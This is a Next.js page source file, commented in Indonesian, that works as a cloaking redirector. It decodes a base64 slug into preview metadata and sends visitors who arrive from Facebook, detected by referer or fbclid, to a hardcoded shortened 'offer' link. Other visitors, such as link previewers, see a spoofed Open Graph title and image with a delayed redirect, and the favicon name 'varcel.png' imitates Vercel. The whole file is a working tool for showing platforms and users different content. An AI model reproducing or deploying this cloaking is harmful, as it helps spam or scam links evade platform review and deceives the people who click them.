// pages/data/[...slug].tsx 
import { GetServerSideProps } from "next";
import Head from "next/head";
import { useEffect } from "react";

interface Props {
  redirectUrl: string;
  imageUrl: string;
  title: string;
}

// Ganti ini dengan link tujuan jika user datang dari Facebook
const offerUrl = "https://shorturl.at/jfcIa";

export const getServerSideProps: GetServerSideProps = async (context) => {
  const slugParts = context.params?.slug || [];
  const encoded = Array.isArray(slugParts) ? slugParts.join("") : slugParts;
  const fbclid = context.query.fbclid;
  const referer = context.req.headers.referer || "";

  if (!encoded) return { notFound: true };

  try {
    const decoded = Buffer.from(encoded, "base64").toString("utf-8");
    const data = JSON.parse(decoded);
    const { redirectUrl, imageUrl, title } = data;

    if (!redirectUrl || !imageUrl) {
      throw new Error("Invalid redirect data.");
    }

    // Redirect langsung jika dari Facebook (atau fbclid terdeteksi)
    if (referer.includes("facebook.com") || fbclid) {
      return {
        redirect: {
          destination: offerUrl,
          permanent: false,
        },
      };
    }

    // Tampilkan halaman loading sementara
    return {
      props: {
        redirectUrl,
        imageUrl,
        title: title || "FB.me",
      },
    };
  } catch (err) {
    return { notFound: true };
  }
};

export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
  useEffect(() => {
    const timer = setTimeout(() => {
      window.location.href = redirectUrl;
    }, 2500);
    return () => clearTimeout(timer);
  }, [redirectUrl]);

  return (
    <>
      <Head>
        <title>{title}</title>
        <meta property="og:title" content={title}/>
        <meta name="description" content={`Read more  ${redirectUrl}`} />
        <meta property="og:description" content={`Read more  ${redirectUrl}`} />
        <meta property="og:url" content={redirectUrl} />
        <meta property="og:type" content="article" />
        <meta property="og:locale" content="en_US" />
        <link rel="canonical" href={redirectUrl} />
        <link rel="icon" href="/varcel.png" type="image/x-icon" />
        <style>{`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}</style>
      </Head>
      <main style={styles.container}>
        <div style={styles.loader}></div>
        <div style={styles.loadingText}>Please wait...</div>
        {imageUrl && (
          <img
            src={imageUrl}
            width="1200"
            height="630"
            alt={title}
            style={{ display: "none" }}
          />
        )}
      </main>
    </>
  );
}

const styles: { [key: string]: React.CSSProperties } = {
  container: {
    height: "100vh",
    display: "flex",
    flexDirection: "column",
    justifyContent: "center",
    alignItems: "center",
    background: "linear-gradient(135deg, #f9f9f9 0%, #e0e0e0 100%)",
    color: "#333",
    fontFamily: "sans-serif",
    padding: "1rem",
    textAlign: "center",
  },
  loader: {
    width: 64,
    height: 64,
    border: "6px solid rgba(0, 112, 243, 0.2)",
    borderTop: "6px solid #0070f3",
    borderRadius: "50%",
    animation: "spin 1s ease-in-out infinite",
    boxShadow: "0 0 12px rgba(0, 112, 243, 0.3)",
  },
  loadingText: {
    marginTop: "20px",
    fontSize: "1.2rem",
    fontWeight: 500,
    letterSpacing: "0.5px",
    opacity: 0.8,
  },
};
